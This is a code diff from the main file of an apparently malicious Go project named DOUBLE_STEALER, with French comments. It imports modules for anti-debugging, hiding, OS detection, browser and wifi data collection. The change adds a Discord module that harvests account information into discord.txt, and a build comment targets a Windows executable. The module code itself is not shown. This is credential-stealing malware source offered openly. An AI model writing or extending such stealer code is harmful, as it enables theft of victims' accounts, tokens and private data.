@@ -3,10 +3,11 @@ package main
 import (
 	"DOUBLE_STEALER/antibug"
 	"DOUBLE_STEALER/creation" // pour le module creation
-	"DOUBLE_STEALER/getdata"  // pour le module Get_Data
-	"DOUBLE_STEALER/getnav"   // pour le module Get_Nav
-	"DOUBLE_STEALER/getos"    // pour le module Detection_Os
-	"DOUBLE_STEALER/getwifi"  // pour le module Hide
+	"DOUBLE_STEALER/discord"
+	"DOUBLE_STEALER/getdata" // pour le module Get_Data
+	"DOUBLE_STEALER/getnav"  // pour le module Get_Nav
+	"DOUBLE_STEALER/getos"   // pour le module Detection_Os
+	"DOUBLE_STEALER/getwifi" // pour le module Hide
 	"DOUBLE_STEALER/hide"
 	"log"
 	"path/filepath"
@@ -85,6 +86,15 @@ func main() {
 	}
 
 	log.Printf("Les informations système ont été écrites dans %s\n", infoFile)
+
+	// Récupérer les informations Discord et les écrire dans discord.txt
+	discordFile := filepath.Join(dataFolder, "discord.txt")
+	err = discord.SaveDiscordInfo(discordFile)
+	if err != nil {
+		log.Printf("Erreur lors de la récupération des informations Discord : %v", err)
+		return
+	}
+	log.Printf("Les informations Discord ont été écrites dans %s\n", discordFile)
 }
 
 //go build -o monExecutable-windows.exe
